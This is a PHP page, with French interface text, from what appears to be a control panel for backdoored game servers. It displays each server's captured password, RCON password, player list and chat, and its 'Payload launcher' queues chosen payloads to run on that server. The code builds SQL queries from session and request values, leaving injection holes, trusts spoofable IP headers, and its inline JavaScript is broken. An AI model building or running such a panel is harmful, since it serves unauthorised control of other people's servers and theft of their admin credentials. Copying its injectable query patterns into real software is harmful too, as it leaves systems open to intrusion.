<?php

session_start();  
if(!isset($_SESSION["username"]))  
{  
      die(header("location:login.php"));  
}  
include "includes/eldb.php";

$ifban = "SELECT ban FROM users WHERE username = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifban)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
            if ($row["ban"] == 1){
                die(header("location:oops.php"));
            }
        }
    }
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$ifip = "SELECT ipvalidate FROM users WHERE username = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifip)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
            if ($row["ipvalidate"] != $ip){
                die(header("location:oh!.php"));
            }
        }
    }
}


if(!isset($_GET["serv"])){
  die(header("location:dashboard.php"));
}
$idserv = $_GET["serv"];

$getaccess = "SELECT * FROM users WHERE username = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $getaccess)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
          if ($row["rank"] == 2){
          }else{
            $ifaccess = "SELECT token FROM servers WHERE token = '".$row["token"]."' AND  id = $idserv";
              if($resultd = mysqli_query($db, $ifaccess)){
                 if(mysqli_num_rows($resultd) > 0){
              }else{
                setlocale (LC_TIME, 'fr_FR.utf8','fra'); 
                $stmt = $db->prepare("INSERT INTO logs (comment, heure, rank, status) VALUES (?, ?, ?, ?)");
                $stmt->bind_param("ssss", $comment, $heure, $rank, $status);
                $comment = $_SESSION["username"]." a tenté d'accéder à un serveur dont il ne disposait pas l'accès.";
                $heure = strftime('%d %B %Y à %H:%M',strtotime("+6 hours")); 
                $rank = "2";
                $status = "error";
                $stmt->execute();
                $stmt->close();
                die("Bien essayé, les administrateurs ont été prévenu de votre présence sur une page dont vous ne disposez pas l'accès.");
              }
            }
          }
        }
    }
}

if($_GET["mask"] === "true"){
  $check = "SELECT * FROM users WHERE username = '".$_SESSION['username']."'";
  if($resultc = mysqli_query($db, $check)){
  if(mysqli_num_rows($resultc) > 0){
  while($rowa = mysqli_fetch_array($resultc)){
  if ($rowa["rank"] == 2){
  $maskserv = "SELECT * FROM servers WHERE id = $idserv";
    if($resultd = mysqli_query($db, $maskserv)){
        if(mysqli_num_rows($resultd) > 0){
                $stmtd = $db->prepare("UPDATE servers SET mask = ? WHERE id = ?");
                $stmtd->bind_param("ss", $mask, $id);
            $mask = "1";
            $id = $idserv;
            $stmtd->execute();
            $stmtd->close();
            $_POST["success"] = "Le serveur a été masqué avec succès.";
        }else{
          $_POST["error"] = "Une erreur est survenue. Contactez un administrateur.";
        }
    }
  }else{
     $_POST["error"] = "Permission refusée.";
  }
}
}
}
}

if($_GET["mask"] === "false"){
   $check = "SELECT * FROM users WHERE username = '".$_SESSION['username']."'";
  if($resultc = mysqli_query($db, $check)){
  if(mysqli_num_rows($resultc) > 0){
  while($rowa = mysqli_fetch_array($resultc)){
  if ($rowa["rank"] == 2){
  $dmaskserv = "SELECT * FROM servers WHERE id = $idserv";
    if($resultd = mysqli_query($db, $dmaskserv)){
        if(mysqli_num_rows($resultd) > 0){
                $stmtd = $db->prepare("UPDATE servers SET mask = ? WHERE id = ?");
                $stmtd->bind_param("ss", $mask, $id);
            $mask = "0";
            $id = $idserv;
            $stmtd->execute();
            $stmtd->close();
            $_POST["success"] = "Le serveur est désormais visible.";
         }else{
          $_POST["error"] = "Une erreur est survenue. Contactez un administrateur.";
        }
    }
  }else{
     $_POST["error"] = "Permission refusée.";
  }
}
}
}
}

if (isset($_POST["sendpay"])){
  $searchpay = "SELECT id FROM payloads WHERE name = '".$_POST["payloadselected"]."'";
      if($resultd = mysqli_query($db, $searchpay)){
        if(mysqli_num_rows($resultd) > 0){
              while($rowd = mysqli_fetch_array($resultd)){ 
                $stmtd = $db->prepare("UPDATE servers SET payload = ? WHERE id = ?");
                $stmtd->bind_param("ss", $payload, $id);
            $payload = $rowd["id"];
            $id = $idserv;
            $stmtd->execute();
            $stmtd->close();
            $_POST["success"] = "Payload lancé avec succès. Attendez au moins 3 secondes avant d'effectuer un nouveau lancement.";
          }
        }else{
          $_POST["error"] = "Une erreur est survenue. Contactez un administrateur.";
        }
    }

}

if (isset($_POST["deletechat"])){
  $stmtl = $db->prepare("DELETE FROM serverchat WHERE serverid = ?");
    $stmtl->bind_param("s", $serverid);
    $serverid = $idserv;
    $stmtl->execute();
    $stmtl->close();
}
$ids = $db->real_escape_string($idserv);
$sql = "SELECT * FROM servers WHERE id = $ids";
  if($result = mysqli_query($db, $sql)){
    if(mysqli_num_rows($result) > 0){
      while($row = mysqli_fetch_array($result)){ ?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
  <link rel="icon" type="image/png" href="assets/img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>
    Accès serveur
  </title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
  <script src="https://kit.fontawesome.com/647923b639.js"></script>
  <!-- CSS Files -->
  <link href="assets/css/material-dashboard.css?v=2.1.0" rel="stylesheet" />
  <link href="assets/css/chat.css" rel="stylesheet" />
</head>
<!-- CHAT FUNCTION : -->
<?php 
  
function startsWith ($string, $startString) 
{ 
    $len = strlen($startString); 
    return (substr($string, 0, $len) === $startString); 
}  
?>  
<body class="dark-edition">
  <div class="wrapper ">
<?php include "includes/side.php"; ?>
    <div class="main-panel">
      <!-- Navbar -->
     <?php include "includes/nav.php"; ?>
      <!-- End Navbar -->
       <div class="content">
        <div class="container-fluid">

          <div class="row">
            <div class="col-md-8">
              <div class="card">
                <div class="card-header card-header-tabs card-header-danger">
                  <div class="nav-tabs-navigation">
                    <div class="nav-tabs-wrapper">
                      <span class="nav-tabs-title">Serveur :</span>
                      <ul class="nav nav-tabs" data-tabs="tabs">
                        <li class="nav-item">
                          <a class="nav-link active" href="#profile" data-toggle="tab">
                            <i class="fas fa-comments"></i> Chat
                            <div class="ripple-container"></div>
                          </a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link" href="#messages" data-toggle="tab">
                            <i class="fas fa-info-circle"></i> Informations
                            <div class="ripple-container"></div>
                          </a>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
                <div class="card-body">
                    <div class="tab-content">
                      <div class="tab-pane active" id="profile">
                  <style type="text/css"> 
                    #madiv{height:300pt;overflow:auto} 
                    </style> 
<!-- MODAL -->
<div class="modal fade center" id="mdpmodif" tabindex="-1" role="dialog" aria-labelledby="modal"
  aria-hidden="true">
<div class="col-md-5">
  <form method="POST">
              <div class="card card-profile modal-body">
                <div class="card-body">
                  <h4 class="card-title">Êtes-vous sûr de vouloir supprimer l'intégralité du chat ? Cette action est irréversible.</h4>
                  <p class="card-description">
                  </p>
                  <div class="col-md-13">
                        <div class="form-group">
                          <label class="bmd-label-floating"></label>
                        </div>
                      </div>
                  <a href="server-access.php?serv=<?php echo $row['id']; ?>" class="btn btn-danger btn-round">Annuler</a>
                  <button type="submit" name="deletechat" class="btn btn-success btn-round">Supprimer</button>
                </div>
              </div>
</form>
</div>

</div>
<!-- / MODAL -->
                      <div class="container-flude" id="madiv">Chargement du chat en cours...
      
                               
              
    </div> 
            <!-- <form method="post" onsubmit="SubmitData();">
                          <input type="text" id="comment" class="form-control">
                        <button id='sendpz' class="btn btn-success pull-right" type="submit"><i class="fas fa-share"></i> Envoyer</button>
                    </form> -->
                    <button type="button" data-toggle="modal" data-target="#mdpmodif" class="btn btn-danger pull-right"><i class="fas fa-trash"></i>  Supprimer le chat</button>
                </div>
                    <div class="tab-pane" id="messages">
Mot de passe : <label class="text-primary"><? echo $row["password"]; ?></label>
                  <div class="clearfix">&nbsp;</div>
                  Mot de passe RCON : <label class="text-primary"><? echo $row["rcon"]; ?></label>
                  <div class="clearfix">&nbsp;</div>
                  Joueurs connectés : <label class="text-primary"><? echo $row["players"]; ?></label>
                  <div class="clearfix">&nbsp;</div>
                  <?php 
                  $duree = $row["uptime"];
                  $minutes=$duree%60;
            $heures=($duree-$minutes)/60; ?>
                  UPTime : <label class="text-primary"><? echo $heures." heures et "; echo $minutes; ?> minutes</label>
                  <div class="clearfix">&nbsp;</div>
                  Liste des joueurs :
                  <div class="clearfix">&nbsp;</div>
                  <label class="text-primary"><? echo nl2br($row["ply"]); ?></label>
                    </div>
              </div>

            </div>
          </div>

            </div>
            <div class="col-md-4">
              <div class="card">
                <div class="card-header card-header-primary">
                  <h4 class="card-title">Payload launcher</h4>
                  <p class="card-category">Exécutez les payloads</p>
                </div>
                <div class="card-body">
                  <?php 
                  $check = "SELECT * FROM users WHERE username = '".$_SESSION['username']."'";
                          if($resultc = mysqli_query($db, $check)){
                              if(mysqli_num_rows($resultc) > 0){
                                while($rowa = mysqli_fetch_array($resultc)){
                                  if($rowa["rank"] == 1){
                                  $sqld = "SELECT * FROM payloadscate WHERE token = '".$rowa["token"]."'";
                                  }else{
                                  $sqld = "SELECT * FROM payloadscate";
                                  }
            if($resultd = mysqli_query($db, $sqld)){
              if(mysqli_num_rows($resultd) > 0){
                while($rowd = mysqli_fetch_array($resultd)){ ?>
          <form method="POST">
                  <label><? echo $rowd["name"]?></label>
            <select name="payloadselected" class="custom-select" style="background-color: #1A2035; color: #FFFFFF; border: 5px; border-color : #661515; box-shadow: none;">
          <?php $sqldd = "SELECT * FROM payloads WHERE category = '".$rowd["name"]."'";
            if($resultdd = mysqli_query($db, $sqldd)){
              if(mysqli_num_rows($resultdd) > 0){
                while($rowdd = mysqli_fetch_array($resultdd)){ ?>
                  <option value="<? echo $rowdd["name"]; ?>"><? echo $rowdd["name"]; ?></option>
                  <? }
                }
         } ?>
            </select>
            <button type="submit" name="sendpay" class="btn btn-success pull-right"><i class="fas fa-check"></i>&nbsp;Exécuter</button>
                    <div class="clearfix">&nbsp;</div>
                    </form>
                <? }
            }
        }
        }
        }
        } ?>
                </div>
              </div>
            </div>
        </div>
            </div>
          </div>
        </div>
      </div>
      
    </div>
  </div>
  <script type="text/javascript">
    function SubmitData() {

  var comment = document.getElementById("comment").value;
  if(comment)
  {
    $.ajax
    ({
      type: 'post',
      url: 'includes/chatresponse.php',
      data: 
      {
         chat:comment
      },
      success: function (response) 
      {
      alert.('ti');
  
      }
    });

}
  </script>
  <script>
setInterval(function() {
    $('#madiv').load('includes/chat.php?serv=<?php echo $idserv; ?>').fadeIn("slow");
}, 2000);
</script>
  
  <!--   Core JS Files   -->
  <script src="assets/js/core/jquery.min.js"></script>
  <script src="assets/js/core/popper.min.js"></script>
  <script src="assets/js/core/bootstrap-material-design.min.js"></script>
  <script src="https://unpkg.com/default-passive-events"></script>
  <script src="assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!-- Place this tag in your head or just before your close body tag. -->
  <script async defer src="https://buttons.github.io/buttons.js"></script>
  <!-- Chartist JS -->
  <script src="assets/js/plugins/chartist.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="assets/js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="assets/js/material-dashboard.js?v=2.1.0"></script>
  <script>
    $(document).ready(function() {
      $().ready(function() {
        $sidebar = $('.sidebar');

        $sidebar_img_container = $sidebar.find('.sidebar-background');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');

        window_width = $(window).width();

        $('.fixed-plugin a').click(function(event) {
          // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .active-color span').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-color', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data-color', new_color);
          }
        });

        $('.fixed-plugin .background-color .badge').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('background-color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-background-color', new_color);
          }
        });

        $('.fixed-plugin .img-holder').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).parent('li').siblings().removeClass('active');
          $(this).parent('li').addClass('active');


          var new_image = $(this).find("img").attr('src');

          if ($sidebar_img_container.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            $sidebar_img_container.fadeOut('fast', function() {
              $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
              $sidebar_img_container.fadeIn('fast');
            });
          }

          if ($full_page_background.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $full_page_background.fadeOut('fast', function() {
              $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
              $full_page_background.fadeIn('fast');
            });
          }

          if ($('.switch-sidebar-image input:checked').length == 0) {
            var new_image = $('.fixed-plugin li.active .img-holder').find("img").attr('src');
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
            $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.css('background-image', 'url("' + new_image + '")');
          }
        });

        $('.switch-sidebar-image input').change(function() {
          $full_page_background = $('.full-page-background');

          $input = $(this);

          if ($input.is(':checked')) {
            if ($sidebar_img_container.length != 0) {
              $sidebar_img_container.fadeIn('fast');
              $sidebar.attr('data-image', '#');
            }

            if ($full_page_background.length != 0) {
              $full_page_background.fadeIn('fast');
              $full_page.attr('data-image', '#');
            }

            background_image = true;
          } else {
            if ($sidebar_img_container.length != 0) {
              $sidebar.removeAttr('data-image');
              $sidebar_img_container.fadeOut('fast');
            }

            if ($full_page_background.length != 0) {
              $full_page.removeAttr('data-image', '#');
              $full_page_background.fadeOut('fast');
            }

            background_image = false;
          }
        });

        $('.switch-sidebar-mini input').change(function() {
          $body = $('body');

          $input = $(this);

          if (md.misc.sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            md.misc.sidebar_mini_active = false;

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar();

          } else {

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar('destroy');

            setTimeout(function() {
              $('body').addClass('sidebar-mini');

              md.misc.sidebar_mini_active = true;
            }, 300);
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);

        });
      });
    });
  </script>
</body>
<?php if (isset($_POST["success"])) { ?> 
<script> md.showNotification("top","right","3","<?php echo htmlspecialchars($_POST["success"]) ?>","done") </script>
<?php } ?>
<?php if (isset($_POST["error"])) { ?> 
<script> md.showNotification("top","right","2","<?php echo htmlspecialchars($_POST["error"]) ?>","report_problem") </script>
<?php } ?>
</html>
<?php
}
}else{
  die("Le serveur est introuvable.");
}

}else{
  die("Une erreur est survenue");
}